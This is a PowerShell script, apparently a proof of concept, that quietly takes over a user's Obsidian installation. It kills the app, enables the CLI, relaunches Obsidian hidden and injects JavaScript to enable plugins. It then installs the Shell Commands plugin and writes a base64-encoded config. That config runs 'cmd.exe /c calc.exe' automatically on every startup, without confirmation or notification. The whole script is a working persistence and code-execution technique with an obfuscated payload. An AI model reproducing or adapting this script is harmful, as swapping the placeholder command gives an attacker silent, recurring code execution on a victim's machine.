Stop-Process -Name "Obsidian" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

$file = "$env:APPDATA\obsidian\obsidian.json"
$json = Get-Content $file -First 1 | ConvertFrom-Json
$ids = $json.vaults.PSObject.Properties.Name

if ($json.cli -ne $true) {
    $json | Add-Member -NotePropertyName "cli" -NotePropertyValue $true -Force
}

$openVault = $json.vaults.PSObject.Properties | Where-Object { $_.Value.open -eq $true }

if (-not $openVault) {
    $last = ($json.vaults.PSObject.Properties | Select-Object -Last 1)
    $last.Value | Add-Member -NotePropertyName "open" -NotePropertyValue $true -Force
    $openVault = $last
}

$vaultPath = $openVault.Value.path
$json | ConvertTo-Json -Depth 10 -Compress | Set-Content $file -NoNewline

$ObsidianPathExe = "$env:LocalAppData\Programs\Obsidian\Obsidian.exe"
$ObsidianPathCom = "$env:LocalAppData\Programs\Obsidian\Obsidian.com"

powershell -Command "Start-Process '$ObsidianPathExe' -WindowStyle Hidden"
Start-Sleep -Seconds 3

$json = Get-Content $file -First 1 | ConvertFrom-Json
$ids = $json.vaults.PSObject.Properties.Name

$jsRemove = "Object.keys(localStorage).filter(k=>k.startsWith('enable-plugin-')).forEach(k=>localStorage.removeItem(k))"
$jsAdd = ($ids | ForEach-Object { "localStorage.setItem('enable-plugin-$_','true')" }) -join ";"
$jsCode = "$jsRemove;$jsAdd"

$Arguments = "eval", "code=$jsCode"
Start-Process -FilePath $ObsidianPathCom -ArgumentList $Arguments -WindowStyle Hidden -Wait
Start-Process -FilePath $ObsidianPathCom -ArgumentList "plugin:install id=obsidian-shellcommands" -WindowStyle Hidden -Wait
Start-Process -FilePath $ObsidianPathCom -ArgumentList "plugin:enable id=obsidian-shellcommands" -WindowStyle Hidden -Wait

$jsonBase64PluginConf = "ewogICJzZXR0aW5nc192ZXJzaW9uIjogIjAuMjMuMCIsCiAgImRlYnVnIjogZmFsc2UsCiAgIm9ic2lkaWFuX2NvbW1hbmRfcGFsZXR0ZV9wcmVmaXgiOiAiRXhlY3V0ZTogIiwKICAicHJldmlld192YXJpYWJsZXNfaW5fY29tbWFuZF9wYWxldHRlIjogdHJ1ZSwKICAic2hvd19hdXRvY29tcGxldGVfbWVudSI6IHRydWUsCiAgIndvcmtpbmdfZGlyZWN0b3J5IjogIiIsCiAgImRlZmF1bHRfc2hlbGxzIjoge30sCiAgImVudmlyb25tZW50X3ZhcmlhYmxlX3BhdGhfYXVnbWVudGF0aW9ucyI6IHt9LAogICJzaG93X2luc3RhbGxhdGlvbl93YXJuaW5ncyI6IHRydWUsCiAgImVycm9yX21lc3NhZ2VfZHVyYXRpb24iOiAyMCwKICAibm90aWZpY2F0aW9uX21lc3NhZ2VfZHVyYXRpb24iOiAxMCwKICAiZXhlY3V0aW9uX25vdGlmaWNhdGlvbl9tb2RlIjogImRpc2FibGVkIiwKICAib3V0cHV0X2NoYW5uZWxfY2xpcGJvYXJkX2Fsc29fb3V0cHV0c190b19ub3RpZmljYXRpb24iOiB0cnVlLAogICJvdXRwdXRfY2hhbm5lbF9ub3RpZmljYXRpb25fZGVjb3JhdGVzX291dHB1dCI6IHRydWUsCiAgImVuYWJsZV9ldmVudHMiOiB0cnVlLAogICJhcHByb3ZlX21vZGFsc19ieV9wcmVzc2luZ19lbnRlcl9rZXkiOiB0cnVlLAogICJjb21tYW5kX3BhbGV0dGUiOiB7CiAgICAicmVfZXhlY3V0ZV9sYXN0X3NoZWxsX2NvbW1hbmQiOiB7CiAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgInByZWZpeCI6ICJSZS1leGVjdXRlOiAiCiAgICB9CiAgfSwKICAibWF4X3Zpc2libGVfbGluZXNfaW5fc2hlbGxfY29tbWFuZF9maWVsZHMiOiBmYWxzZSwKICAic2hlbGxfY29tbWFuZHMiOiBbCiAgICB7CiAgICAgICJpZCI6ICI0bm5kcHkyMjVsIiwKICAgICAgInBsYXRmb3JtX3NwZWNpZmljX2NvbW1hbmRzIjogewogICAgICAgICJkZWZhdWx0IjogImNtZC5leGUgL2MgY2FsYy5leGUiCiAgICAgIH0sCiAgICAgICJzaGVsbHMiOiB7fSwKICAgICAgImFsaWFzIjogIiIsCiAgICAgICJpY29uIjogbnVsbCwKICAgICAgImNvbmZpcm1fZXhlY3V0aW9uIjogZmFsc2UsCiAgICAgICJpZ25vcmVfZXJyb3JfY29kZXMiOiBbXSwKICAgICAgImlucHV0X2NvbnRlbnRzIjogewogICAgICAgICJzdGRpbiI6IG51bGwKICAgICAgfSwKICAgICAgIm91dHB1dF9oYW5kbGVycyI6IHsKICAgICAgICAic3Rkb3V0IjogewogICAgICAgICAgImhhbmRsZXIiOiAiaWdub3JlIiwKICAgICAgICAgICJjb252ZXJ0X2Fuc2lfY29kZSI6IHRydWUKICAgICAgICB9LAogICAgICAgICJzdGRlcnIiOiB7CiAgICAgICAgICAiaGFuZGxlciI6ICJub3RpZmljYXRpb24iLAogICAgICAgICAgImNvbnZlcnRfYW5zaV9jb2RlIjogdHJ1ZQogICAgICAgIH0KICAgICAgfSwKICAgICAgIm91dHB1dF93cmFwcGVycyI6IHsKICAgICAgICAic3Rkb3V0IjogbnVsbCwKICAgICAgICAic3RkZXJyIjogbnVsbAogICAgICB9LAogICAgICAib3V0cHV0X2NoYW5uZWxfb3JkZXIiOiAic3Rkb3V0LWZpcnN0IiwKICAgICAgIm91dHB1dF9oYW5kbGluZ19tb2RlIjogImJ1ZmZlcmVkIiwKICAgICAgImV4ZWN1dGlvbl9ub3RpZmljYXRpb25fbW9kZSI6IG51bGwsCiAgICAgICJldmVudHMiOiB7CiAgICAgICAgIm9uLWxheW91dC1yZWFkeSI6IHsKICAgICAgICAgICJlbmFibGVkIjogdHJ1ZQogICAgICAgIH0KICAgICAgfSwKICAgICAgImRlYm91bmNlIjogbnVsbCwKICAgICAgImNvbW1hbmRfcGFsZXR0ZV9hdmFpbGFiaWxpdHkiOiAiZW5hYmxlZCIsCiAgICAgICJwcmVhY3Rpb25zIjogW10sCiAgICAgICJ2YXJpYWJsZV9kZWZhdWx0X3ZhbHVlcyI6IHt9CiAgICB9CiAgXSwKICAicHJvbXB0cyI6IFtdLAogICJidWlsdGluX3ZhcmlhYmxlcyI6IHt9LAogICJjdXN0b21fdmFyaWFibGVzIjogW10sCiAgImN1c3RvbV92YXJpYWJsZXNfbm90aWZ5X2NoYW5nZXNfdmlhIjogewogICAgIm9ic2lkaWFuX3VyaSI6IHRydWUsCiAgICAib3V0cHV0X2Fzc2lnbm1lbnQiOiB0cnVlCiAgfSwKICAiY3VzdG9tX3NoZWxscyI6IFtdLAogICJvdXRwdXRfd3JhcHBlcnMiOiBbXQp9DQo="

$bytes = [Convert]::FromBase64String($jsonBase64PluginConf)
$jsonPluginConf = [System.Text.Encoding]::UTF8.GetString($bytes)

$finalPath = Join-Path -Path $openVault.Value.path -ChildPath ".obsidian\plugins\obsidian-shellcommands\data.json"
[System.IO.File]::WriteAllText($finalPath, $jsonPluginConf, [System.Text.UTF8Encoding]::new($false))

Start-Sleep -Seconds 2
Stop-Process -Name "Obsidian" -Force -ErrorAction SilentlyContinue